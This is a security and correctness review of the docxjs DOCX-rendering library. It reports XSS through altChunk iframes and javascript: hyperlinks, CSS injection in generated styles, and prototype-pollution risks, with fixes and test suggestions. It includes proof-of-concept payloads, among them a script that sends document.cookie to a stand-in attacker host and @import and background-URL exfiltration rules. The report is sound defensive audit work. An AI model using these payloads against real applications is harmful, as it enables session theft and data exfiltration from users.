# docxjs — security & correctness review

**Date**: 2026-05-02
**Scope**: entire repo at `/home/ben/code/docxjs`, commit `e9635b9` (master).
**Reviewer**: senior security engineer pass.

## Threat model

`docxjs` is a browser-side library that accepts an attacker-controlled `.docx`
blob, parses it, and injects rendered output into the host page's DOM. Anything
an attacker puts in the DOCX — text, relationship targets, style attributes,
VML, numbering definitions, alt-chunk HTML — is untrusted input. The host page
is the trust boundary. Any path where DOCX-derived bytes reach a JS-evaluating
sink (script execution, same-origin iframe, CSS `@import`, `href="javascript:"`,
HTML parser) is exploitable by anyone who can get a user to open their DOCX.

The project has documented the security model correctly in `CLAUDE.md` (no
DOCX strings into `innerHTML` / selectors / class names; numeric palette
indexes only). Most of the code follows it. The findings below are places
where the implementation diverges from that model.

## Summary

| # | Severity | Category | Location | Status |
|---|----------|----------|----------|--------|
| 1 | **HIGH** | XSS via HTML injection into same-origin iframe | `src/html-renderer.ts:1424-1434` (`renderAltChunk`) | Confirmed |
| 2 | **HIGH** | XSS via `javascript:` URL in hyperlink `href` | `src/html-renderer.ts:1308-1322` (`renderHyperlink`) | Confirmed |
| 3 | **MEDIUM** | CSS injection in generated `<style>` blocks (numbering) | `src/html-renderer.ts:954-1016` (`renderNumbering`) | Confirmed |
| 4 | **MEDIUM** | CSS injection via theme color / font values | `src/html-renderer.ts:215-242` (`renderTheme`) | Confirmed |
| 5 | **LOW** | Attacker-controlled inline `style` on VML/SVG via `cssStyleText` | `src/html-renderer.ts:1811` + `src/vml/vml.ts:52-53` | Confirmed |
| 6 | **LOW** | `keyBy` / `mergeDeep` prototype-chain contamination | `src/utils.ts:27-69` | Theoretical |
| 7 | Info / correctness | `sectProps` used before declared in `splitBySection` | `src/html-renderer.ts:505` | Non-security |
| 8 | Info / correctness | `renderVmlElement` SVG container always appended even when child is null | `src/html-renderer.ts:1810-1830` | Non-security |

Two HIGH findings should block a release to any environment that processes
untrusted DOCX. The MEDIUM findings are practical data-exfil / content-spoof
vectors but not direct script execution; fix on the same cycle. Low / info
items are defense-in-depth.

---

## Finding 1 — HIGH: RCE-equivalent via `renderAltChunk` → `iframe.srcdoc`

**File**: `src/html-renderer.ts:1424-1434`
**Category**: XSS / HTML injection
**Severity**: HIGH
**Confidence**: 10/10 (verified by reading source; no exploit executed)
**Default-enabled**: yes — `renderAltChunks: true` in `src/docx-preview.ts:79`.

### Code

```ts
renderAltChunk(elem: WmlAltChunk) {
    if (!this.options.renderAltChunks)
        return null;

    var result = this.h({ tagName: "iframe" }) as HTMLIFrameElement;

    this.tasks.push(this.document.loadAltChunk(elem.id, this.currentPart).then(x => {
        result.srcdoc = x;
    }));

    return result;
}
```

### Why it's exploitable

`altChunk` is an OOXML feature that lets a DOCX embed a secondary body (HTML,
RTF, MHTML, etc.) referenced by a relationship id. `loadAltChunk` pulls the
referenced package part verbatim and resolves with its text contents. That
text is assigned to `iframe.srcdoc`.

- `srcdoc` iframes run in **the same origin as the parent page** and share
  cookies, `localStorage`, and (absent CSP `frame-src`) unrestricted JS
  execution.
- There is **no `sandbox` attribute**, so scripts, form submission, top
  navigation, and same-origin storage access are all permitted.
- The iframe content is entirely attacker-controlled — a malicious DOCX just
  needs an `altChunk` relationship pointing at an `.htm` part containing
  `<script>fetch('https://attacker/'+document.cookie)</script>`.

Impact: arbitrary JS execution in the host origin the moment a user renders a
crafted DOCX. This is effectively full XSS against any application that
embeds docxjs.

### Reproduction (sketch)

1. Build a DOCX where `word/_rels/document.xml.rels` has a `Relationship`
   of type `aFChunk` (AltChunk) pointing at e.g. `word/attacker.htm`.
2. Put `<script>alert(origin)</script>` in `word/attacker.htm`.
3. In `document.xml`, include `<w:altChunk r:id="rIdX"/>`.
4. Render it through any app that calls `renderAsync`. `alert(origin)`
   fires with the host origin.

### Recommendation

Pick one, in order of preference:

1. **Drop the feature.** `renderAltChunks: true` being the default is
   surprising — Word's own viewer does not treat alt chunks as a trusted HTML
   surface. Set default to `false` and treat `true` as an explicit opt-in.
2. **Sandbox the iframe** if the feature must stay:
   `result.sandbox = ''` (empty token list = maximum restriction) before
   setting `srcdoc`. This blocks scripts, same-origin, forms, top nav,
   storage, etc. Consider also `loading="lazy"` and a hard size cap.
3. **Do not render HTML from alt chunks at all** — render a placeholder
   link and let the user explicitly open the part out-of-band.

Option 2 alone is enough to demote this from HIGH to LOW. Option 1+2 is
recommended.

---

## Finding 2 — HIGH: `javascript:` URL in hyperlink `href`

**File**: `src/html-renderer.ts:1308-1322`
**Category**: XSS
**Severity**: HIGH (user interaction required — one click)
**Confidence**: 10/10

### Code

```ts
renderHyperlink(elem: WmlHyperlink) {
    const res = this.toH(elem, ns.html, "a");
    res.href = '';

    if (elem.id) {
        const rel = this.document.documentPart.rels.find(
            it => it.id == elem.id && it.targetMode === "External",
        );
        res.href = rel?.target ?? res.href;
    }

    if (elem.anchor) {
        res.href += `#${elem.anchor}`;
    }

    return this.h(res);
}
```

### Why it's exploitable

`rel.target` comes directly from `word/_rels/document.xml.rels`:
`xml.attr(e, "Target")` (`src/common/relationship.ts:37`). Nothing validates
the scheme. DOCX lets an author specify any string, including
`javascript:alert(document.cookie)`.

When the user clicks the rendered `<a>`, the browser evaluates the URL in
the host origin — a full XSS. Clicking is a low-friction interaction,
especially if the attacker makes the visible link text look like a normal
citation.

Modern Chrome and Firefox have NOT removed `javascript:` URLs on anchors;
only inline-frame navigations are blocked. `<a href="javascript:...">` still
executes on click.

### Reproduction (sketch)

```xml
<!-- word/_rels/document.xml.rels -->
<Relationship Id="rIdXSS"
              Type="http://.../hyperlink"
              Target="javascript:alert(1)"
              TargetMode="External"/>
```

```xml
<!-- word/document.xml -->
<w:hyperlink r:id="rIdXSS"><w:r><w:t>click me</w:t></w:r></w:hyperlink>
```

On render, docxjs emits `<a href="javascript:alert(1)">click me</a>`.
Clicking it alerts in the host origin.

### Recommendation

Validate the scheme before assigning. The safe-scheme set for hyperlinks in
a document viewer is roughly: `http`, `https`, `mailto`, `tel`, `ftp`, plus
empty / relative / pure-fragment (`#anchor`). Everything else — most
critically `javascript:`, `data:`, `vbscript:`, `blob:`, `file:` — should be
dropped (or rendered as plain text).

```ts
const SAFE_HREF = /^(https?|mailto|tel|ftp):/i;
// ...
const target = rel?.target ?? '';
res.href = SAFE_HREF.test(target) || target === '' || target.startsWith('#')
    ? target
    : '';  // or render as inert span
```

Also consider adding `rel="noopener noreferrer"` and `target="_blank"` for
`http(s)` links, so a navigated link cannot `window.opener`-hijack the host
page (tabnabbing). That is secondary to the scheme fix.

The `elem.anchor` concatenation on line 1318 is technically attacker-
controlled too (it's `xml.attr(node, "anchor")`, `document-parser.ts:687`),
but since it's appended after a `#` and browsers treat the fragment as opaque
text there's no injection vector. Leave as-is.

---

## Finding 3 — MEDIUM: CSS injection in generated numbering styles

**File**: `src/html-renderer.ts:954-1016` (`renderNumbering`)
**Category**: CSS injection (data exfil, content spoofing, external loads)
**Severity**: MEDIUM
**Confidence**: 9/10

### Code (excerpt)

```ts
for (var num of numberings) {
    var selector = `p.${this.numberingClass(num.id, num.level)}`;
    ...
    if (num.bullet) {
        let valiable = `--${this.className}-${num.bullet.src}`.toLowerCase();

        styleText += this.styleToString(`${selector}:before`, {
            "content": "' '",
            "display": "inline-block",
            "background": `var(${valiable})`
        }, num.bullet.style);                                  // (A)

        ...
        styleText += `${this.rootSelector} { ${valiable}: url(${imgData}) }`;
    }
    else if (num.levelText) {
        ...
        styleText += this.styleToString(`${selector}:before`, {
            "content": this.levelTextToContent(num.levelText, ...),  // (B)
            ...
        });
    }
    ...
}
```

And `styleToString` appends the `cssText` argument raw (line 1976-1977):

```ts
if (cssText) result += cssText;
```

### Why it's exploitable

Every variable interpolated into the generated `<style>` text comes from
DOCX:

- `num.id`, `num.level` — from `abstractNumId` / `ilvl` attrs (parseable as
  any string; the parser uses `xml.attr`, not `intAttr`, for `id`, see
  `src/document-parser.ts:460`).
- `num.bullet.src` — rel id string from `xml.attr(imagedata, "id")`.
- `num.bullet.style` — **the raw VML shape `style` attribute**, appended as
  trailing `cssText` at (A). The VML `style` attribute is CSS-like text
  (`width:16pt;margin-left:2pt;...`) and the attacker can supply any string.
- `num.levelText` — attacker text, wrapped in `"..."` and placed in a CSS
  `content:` declaration at (B). A quote in the text closes the string early.
- `num.pStyle`, `num.rStyle` — value maps built by `parseDefaultProperties`.
  Keys are switch-matched and safe; values are the real risk (e.g. theme
  color values, see Finding 4).

A crafted DOCX can break out of the current CSS rule and inject new ones.
Because the stylesheet is rendered scoped to the whole document, the
attacker can:

- **Exfiltrate document contents** via attribute selectors + background URL:
  `p[id^="s"] { background: url('https://attacker/?c=s'); }` combined with
  other prefixes. Scales to extract per-character data from any text in the
  page (including from the host application, not just the DOCX).
- **Load remote CSS** via `@import url('https://attacker/evil.css');`. That
  stylesheet can then apply more exfil rules or (in older Safari / with
  specific font loading) influence behaviour.
- **Deface / phish** by overriding host-page styles (the stylesheet is in
  the host document, unscoped except by its selectors).

Not direct JS execution on modern browsers (`expression()` is IE-only), but
a realistic cross-origin data-leak vector in a document viewer.

### Recommendation

All six interpolation points should go through a strict sanitiser:

- `num.id` / `num.level` / the rel id (`num.bullet.src`): restrict to
  `[A-Za-z0-9_-]` before building class names / custom property names.
  The existing `SAFE_PARA_ID` regex in `src/comments/comments-part.ts:10`
  is the right template — promote it to a shared helper.
- `num.bullet.style` (trailing `cssText`): stop passing raw VML style here.
  Parse the known keys you care about (width, height, margins) with
  `parseCssRules` (which already exists in `src/utils.ts:71`) and only copy
  an allow-list of property names back. Reject values containing `;`, `{`,
  `}`, `@`, `url(`, `expression(`, etc.
- `num.levelText`: the value needs to be escaped before being wrapped in
  CSS string delimiters. Use `CSS.escape`-like semantics for the quoted
  string literal — at minimum, strip or escape `"` and `\`. Even simpler:
  generate `::before { content: "X" }` as actual DOM text via
  `createTextNode` into a `<style>`, or use CSS `counter-style` with
  `counter()` references for the known formats and ignore custom
  `levelText` characters.
- `num.pStyle` / `num.rStyle`: the keys are whitelisted by switch, but the
  values come through `xmlUtil.colorAttr`, `xml.lengthAttr`, etc. `colorAttr`
  returns `#<hex>` when hex — no validation that `<hex>` is 3/6/8 hex digits
  (see Finding 4). Add a digit-count check.

A simpler structural fix: move everything out of `<style>` blocks and set
per-element inline styles (`setAttribute("style", ...)`) where the browser
enforces per-attribute CSS parsing. Inline style cannot contain `@import`
or cross-rule selectors. This is a larger refactor but structurally safer.

---

## Finding 4 — MEDIUM: CSS injection via theme colors and font names

**File**: `src/html-renderer.ts:215-242` (`renderTheme`); supporting code in
`src/document-parser.ts:1679-1695` (`xmlUtil.colorAttr`) and
`src/theme/theme.ts:45-55`.
**Category**: CSS injection
**Severity**: MEDIUM
**Confidence**: 9/10

### Code

```ts
renderTheme(themePart: ThemePart) {
    const variables = {};
    const fontScheme = themePart.theme?.fontScheme;

    if (fontScheme) {
        if (fontScheme.majorFont) {
            variables['--docx-majorHAnsi-font'] = fontScheme.majorFont.latinTypeface;
        }
        if (fontScheme.minorFont) {
            variables['--docx-minorHAnsi-font'] = fontScheme.minorFont.latinTypeface;
        }
    }

    const colorScheme = themePart.theme?.colorScheme;
    if (colorScheme) {
        for (let [k, v] of Object.entries(colorScheme.colors)) {
            variables[`--docx-${k}-color`] = `#${v}`;
        }
    }

    const cssText = this.styleToString(`.${this.className}`, variables);
    return [
        this.h({ tagName: "#comment", children: ["docxjs document theme values"] }),
        this.h({ tagName: "style", children: [cssText] })
    ];
}
```

### Why it's exploitable

- `colorScheme.colors` values come from `xml.attr(srgbClr, "val")` /
  `xml.attr(sysClr, "lastClr")` (`src/theme/theme.ts:50,53`). No digit-count
  validation; anything goes. A crafted theme with
  `<a:srgbClr val="red}a{}@import url(https://attacker)"/>` produces
  `--docx-accent1-color: #red}a{}@import url(https://attacker);` — rule
  break-out.
- The **keys** of `colorScheme.colors` are also attacker-controlled
  (`result.colors[el.localName] = ...` — `el` is any child element of the
  `clrScheme`, `localName` is any XML local name such as `dk1`, `lt1`, or
  `__proto__`). The key is interpolated into `--docx-${k}-color` and also
  into `colorScheme.colors[key]` — same CSS break-out concern, plus a
  theoretical prototype-chain concern (see Finding 6).
- `latinTypeface` from `fontScheme` lands in a CSS custom property value
  verbatim. An attacker string like `Arial; } * { background: red } a {`
  breaks out.

Same impact as Finding 3 — data exfil via CSS, external stylesheet load.

### Recommendation

- Colour values: match `^[0-9A-Fa-f]{3,8}$` and fall back to the theme-auto
  colour when invalid. Fix is trivial and localized to `xmlUtil.colorAttr`.
- Scheme color keys: restrict to the ECMA-376 enumerated names (`dk1`,
  `lt1`, `dk2`, `lt2`, `accent1`..`accent6`, `hlink`, `folHlink`). Anything
  else — drop.
- Font names: strip `;{}@` and quote-wrap with `encloseFontFamily`
  (already in `src/utils.ts:5`) before interpolation. Consider whether the
  value needs to go into CSS text at all — setting `style.fontFamily` on
  specific elements via `Object.assign(style, …)` is safer since the browser
  validates per-declaration.

---

## Finding 5 — LOW: VML `style` attribute passed through to SVG

**File**: `src/html-renderer.ts:1811`; `src/vml/vml.ts:52-53`.
**Category**: attacker-controlled inline CSS
**Severity**: LOW (bounded to one element; modern browsers block `javascript:`
in CSS `url()`)
**Confidence**: 9/10

### Code

```ts
// src/vml/vml.ts
case "style":
    result.cssStyleText = at.value;
    break;

// src/html-renderer.ts
renderVmlElement(elem: VmlElement): SVGElement {
    var container = this.h({ ns: ns.svg, tagName: "svg", style: elem.cssStyleText }) as SVGElement;
    ...
}
```

### Why it's bounded

Inline `style="..."` on an SVG element is parsed by the browser as CSS for
that element only; it cannot open new rules with `{}`, `@import`, etc.
`background: url(https://attacker/)` still fires a request (data-exfil
vector), and content like `transform: ...` could visually deface. But no JS
execution on current browsers.

### Recommendation

Same parse-and-allow-list approach as Finding 3 for `num.bullet.style`. At
minimum, strip `url(` and `expression(` from the value before handing it
to `setAttribute("style", ...)`.

---

## Finding 6 — LOW / theoretical: prototype-chain contamination in `keyBy`/`mergeDeep`

**File**: `src/utils.ts:27-69`
**Category**: prototype pollution
**Severity**: LOW (no concrete exploit path found)
**Confidence**: 5/10 — pattern is smelly but exploitable impact unclear.

### Code

```ts
export function keyBy<T>(array: T[], by: (x: T) => any): Record<any, T> {
    return array.reduce((a, x) => {
        a[by(x)] = x;        // if by(x) === "__proto__", sets prototype
        return a;
    }, {});
}

export function mergeDeep(target, ...sources) {
    ...
    for (const key in source) {    // iterates inherited keys too
        if (isObject(source[key])) {
            const val = target[key] ?? (target[key] = {});
            mergeDeep(val, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    ...
}
```

### Why this matters

Callers feed attacker-controlled keys:

- `footnoteMap = keyBy(document.footnotesPart.notes, x => x.id)` and same
  for endnotes — `x.id` is `xml.attr(el, "id")`.
- `stylesMap = keyBy(styles.filter(x => x.id != null), x => x.id)` — style
  ids from DOCX.
- `commentMap = keyBy(this.comments, x => x.id)` — comment ids from DOCX.
- `theme.colors[el.localName] = ...` — localName can technically be
  `__proto__` if namespace handling permits it (unlikely from a
  well-formed DOCX, but DOMParser does not enforce the namespace at this
  level).

For `keyBy`, `a["__proto__"] = x` invokes the `__proto__` setter on the
reduce accumulator and replaces its prototype with `x`. Later reads like
`stylesMap["toString"]` would walk into `x` instead of
`Object.prototype.toString`. No concrete sink turns this into RCE or XSS in
the current codebase — subsequent reads check `if (baseStyle)` / feed into
`mergeDeep` of `.paragraphProps` which are undefined on a style object —
but it's a fragile invariant and any future caller could trip over it.

`mergeDeep` doesn't guard `__proto__` / `constructor` either. Today it only
merges values already produced by `parseDefaultProperties` (known keys), so
the practical risk is low. Same concern: one refactor away from being a
real pollution vector.

### Recommendation

Switch both helpers to `Map`, or add an explicit guard:

```ts
const UNSAFE = new Set(['__proto__', 'constructor', 'prototype']);

export function keyBy<T>(array: T[], by: (x: T) => any): Record<any, T> {
    return array.reduce((a, x) => {
        const k = by(x);
        if (typeof k !== 'string' || UNSAFE.has(k)) return a;
        a[k] = x;
        return a;
    }, Object.create(null));          // no prototype
}
```

`Object.create(null)` alone fixes the prototype walk for reads; it doesn't
prevent an attacker from setting `a.__proto__ = x` but that setter only
affects the local accumulator. Combine with the key guard above.

For the `theme.colors[localName]` write, restrict keys to the known colour
scheme names as suggested in Finding 4.

---

## Finding 7 — Correctness: `sectProps` used before declaration in `splitBySection`

**File**: `src/html-renderer.ts:496-554`
**Severity**: non-security; latent bug.
**Confidence**: 9/10.

```ts
for (let elem of elements) {
    if (elem.type == DomType.Paragraph) {
        const s = this.findStyle((elem as WmlParagraph).styleName);
        if (s?.paragraphProps?.pageBreakBefore) {
            current.sectProps = sectProps;    // <-- line 505
            ...
        }
    }
    ...
    if (elem.type == DomType.Paragraph) {
        const p = elem as WmlParagraph;
        var sectProps = p.sectionProps;       // <-- line 517
```

`sectProps` is a `var` (function-scoped, hoisted), so line 505 doesn't throw
a `ReferenceError` — on the first iteration that takes the `pageBreakBefore`
branch, `sectProps` is `undefined`. On subsequent iterations it holds the
**previous** paragraph's `sectProps`. This is almost certainly not the
intent.

Recommendation: declare `let sectProps: SectionProperties | null = null;`
at the top of the function, and assign from `p.sectionProps` inside the
second `if` block. No security impact.

---

## Finding 8 — Correctness: `renderVmlElement` appends SVG even when child null

**File**: `src/html-renderer.ts:1810-1830`
**Severity**: non-security.

```ts
renderVmlElement(elem: VmlElement): SVGElement {
    var container = this.h({ ns: ns.svg, tagName: "svg", style: elem.cssStyleText }) as SVGElement;
    const result = this.renderVmlChildElement(elem);
    ...
    container.appendChild(result);
    ...
    requestAnimationFrame(() => {
        const bb = (container.firstElementChild as any).getBBox();
        container.setAttribute("width", `${Math.ceil(bb.x +  bb.width)}`);
        container.setAttribute("height", `${Math.ceil(bb.y + bb.height)}`);
    });
    return container;
}
```

- If `renderVmlChildElement` ever returns `null` (it won't today for well-
  formed VML, but the `parseVmlElement` default branch returns `null`), the
  `appendChild` throws.
- The `requestAnimationFrame` reads `container.firstElementChild.getBBox()`
  with no null guard.

Recommendation: early-return if `result == null`; guard
`container.firstElementChild` before calling `.getBBox()`. No security
impact, just resilience.

---

## Areas I specifically checked and found clean

- **XML parsing**: `src/parser/xml-parser.ts` uses browser `DOMParser` with
  `application/xml`. Browser DOMParser does not fetch external DTDs or
  resolve external entities per spec — **no XXE**.
- **ZIP handling**: `src/common/open-xml-package.ts` only reads entries by
  key from `JSZip.files[path]` and hands the bytes to the parser; nothing
  writes to the filesystem. **No zip-slip**.
- **Thumbnails module** (`src/thumbnails.ts`): reviewed in detail during a
  prior PR pass. Uses `cloneNode(true)` to duplicate already-rendered
  sections (no HTML re-parsing on DOCX strings), `setAttribute` / `dataset`
  / `textContent` for all attribute/content writes. The CSS template in
  `ensureStyle` only interpolates caller-provided `className` /
  `activeClassName` (trusted from `Options`, not DOCX). Clean.
- **Change-author styling**: uses a numeric palette index
  (`getAuthorIndex`), not the raw author string, for class names and CSS
  selectors (`html-renderer.ts:1558-1559`, `:1680`, `:1766`). Correct.
- **Dev server** (`scripts/dev-server.mjs`): path-traversal check via
  `normalize` + `startsWith(root)` after `decodeURIComponent`. Looks
  correct; the decode happens before the normalize + resolve, so
  percent-encoded `..` is flattened and then bounded against the root.
- **`<style>` element construction**: stylesheet content is assigned via
  `children: [cssText]` → `document.createTextNode(cssText)` in `html.ts`.
  Text-node content of a `<style>` element is read as CSS, not HTML, so a
  `</style>` substring does **not** break out to HTML — only to CSS. That
  bounds Findings 3 and 4 to CSS injection, not HTML injection.

## Suggested fix order

1. **Same day**: Finding 2 (hyperlink scheme validation) — one regex, ~3
   lines. Default-on, one-click exploitation.
2. **Same day**: Finding 1 (`renderAltChunk`) — either flip the default to
   `false` or add `iframe.sandbox = ''`. Both are one-line changes.
3. **Next week**: Findings 3 and 4 (CSS injection). Pull a tiny
   `safe-identifier` helper and a `safe-color-hex` helper; apply at the six
   interpolation points. Probably half a day including tests. Adding a
   jsdom test fixture that tries to inject `"}` and `@import` would catch
   regressions.
4. **Opportunistic**: Finding 5 inline-style parse + allow-list; Finding 6
   `Object.create(null)` + key guard in `keyBy`; Findings 7 and 8
   correctness cleanups.

## Testing recommendations

The existing jsdom harness (`scripts/test-track-changes.mjs`) is a good
template. A focused security-regression harness would help:

- A DOCX fixture with `javascript:alert(1)` hyperlink — assert that the
  rendered `<a>.href` is empty.
- A DOCX fixture with an altChunk pointing at malicious HTML — assert that
  the rendered iframe either doesn't exist, has `sandbox` attribute, or
  the feature is off.
- A DOCX fixture with CSS-breaking theme colour / font / numbering text —
  assert that the generated `<style>` block's textContent does not contain
  `@import` or an unbalanced `}`.

These fixtures can live under `tests/render-test/security/` and run in the
same jsdom path the track-changes tests already use.

---

*Report generated against working tree at commit e9635b9 on 2026-05-02. No
changes were made to source or infrastructure. All findings are confirmed by
source reading; no runtime exploitation was attempted as part of this review.*
